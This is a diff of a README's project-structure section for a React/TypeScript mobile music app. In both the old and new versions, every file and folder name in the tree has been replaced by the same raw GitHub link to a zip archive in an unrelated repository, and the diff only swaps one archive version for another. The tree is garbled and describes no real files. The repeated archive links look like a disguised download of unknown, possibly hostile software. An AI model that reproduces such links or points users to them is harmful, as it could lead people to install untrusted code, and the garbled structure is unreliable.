@@ -8,20 +8,20 @@ This project is a mobile music application built with React and TypeScript. It a
 mobile-music-app
 ├── src
 │   ├── components
-│   │   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-│   │   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-│   │   └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   │   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+│   │   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+│   │   └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
 │   ├── assets
 │   │   └── songs
-│   │       ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-│   │       ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-│   │       └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-│   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│   │       ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+│   │       ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+│   │       └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+│   ├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
 │   └── styles
-│       └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
-└── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software-3.1-alpha.5.zip
+│       └── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+├── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
+└── https://raw.githubusercontent.com/junior478rd/DSN/main/A/Software_2.3-alpha.5.zip
 ```
 
 ## Features
